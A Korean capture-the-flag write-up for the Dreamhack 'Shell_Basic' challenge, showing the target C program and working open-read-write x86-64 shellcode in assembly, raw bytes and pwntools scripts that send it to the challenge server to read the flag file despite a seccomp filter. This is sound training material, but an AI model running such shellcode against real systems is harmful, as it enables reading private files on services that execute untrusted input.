---
title: Shell_Basic
author: heogi
date: 2023-10-08
categories:
  - Dreamhack
  - CTF
tags:
  - system
  - shellcode
  - ORW
comments: true
---
## Description

> 입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동하고 있습니다.  
> main 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수입니다.  
> flag 파일의 위치와 이름은 /home/shell\_basic/flag\_name\_is\_loooooong입니다.  
> 감 잡기 어려우신 분들은 아래 코드를 가지고 먼저 연습해보세요!  
> 플래그 형식은 DH{...} 입니다. DH{ 와 }도 모두 포함하여 인증해야 합니다.

## **프로그램 분석**

![](../assets/img/Pasted%20image%2020240413005132.png)

문제에서 제시된 프로그램을 실행하면 Shellcode를 입력받는다.

포함되어있는 소스를 보면 쉘코드를 받아서 실행을 해준다.

```c
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);   
  void (*sc)();
  
  init();
  
  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

execve, execveat 함수는 사용하지 못 하도록 되어있어 Flag를 ORW(Open Read Write) 쉘코드를 통해 읽어야한다.

## **ShellCode 작성**

\* shellcode.asm

```
; File name: shellcode.asm
section .text
global _start
_start:
push 0x0
mov rax, 0x676e6f6f6f6f6f6f ; oooooong
push rax
mov rax, 0x6c5f73695f656d61 ; ame_is_l
push rax
mov rax, 0x6e5f67616c662f63 ; c/flag_n
push rax
mov rax, 0x697361625f6c6c65 ; ell_basi
push rax
mov rax, 0x68732f656d6f682f ; /home/sh
push rax
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x2
syscall ; Open

mov rdi, rax
mov rsi, rsp
sub rsi, 0x30
mov rdx, 0x30
mov rax, 0x0
syscall ;Read

mov rdi, 0x1
mov rax, 0x1
syscall ; Write
```

Flag 파일의 경로는 `/home/shell_basic/flag_name_is_loooooong`로 8 Btye 씩 잘라서 스택에 Push 해준다.

asm을 작성 후 아래 명령어를 통해 쉘코드를 작성한다.

8 Byte 씩 자른 문자열은 아래 명령어를 통해 little endian 방식으로 packing을 진행한다.

```python
>>> p64(int(binascii.hexlify(b"oooooong"),16)).hex()
'676e6f6f6f6f6f6f'
```

```shell
nasm -f elf64 shellcode.asm
objdump -d shellcode.o
objcopy --dump-section .text=shellcode.bin shellcode.o
hexdump -v -e '"\\""x" 1/1 "%02x" ""' shellcode.bin
```

패킹을 진행한 쉘코드 바이트를 pwntools를 통해 서버에 입력한다.

```python
from pwn import *

p = remote("host3.dreamhack.games",18477)

shellcode = b"\x6a\x00\x48\xb8\x6f\x6f\x6f\x6f\x6f\x6f\x6e\x67\x50\x48\xb8\x61\x6d\x65\x5f\x69\x73\x5f\x6c\x50\x48\xb8\x63\x2f\x66\x6c\x61\x67\x5f\x6e\x50\x48\xb8\x65\x6c\x6c\x5f\x62\x61\x73\x69\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x73\x68\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\x83\xee\x30\xba\x30\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05"

p.send(shellcode)
p.interactive()
```

![](../assets/img/Pasted%20image%2020240413005303.png)

아래는 ShellCraft를 통해 작성한 ORW Shellcode 이다.

```python
from pwn import *

context(arch="amd64", os="linux")

p = remote("host3.dreamhack.games",17850)

shellcode = shellcraft.open("/home/shell_basic/flag_name_is_loooooong")
shellcode += shellcraft.read("rax","rsp",100)
shellcode += shellcraft.write(1,"rsp",100)

p.recvuntil("shellcode:")
p.send(asm(shellcode))

print(p.recvline())
```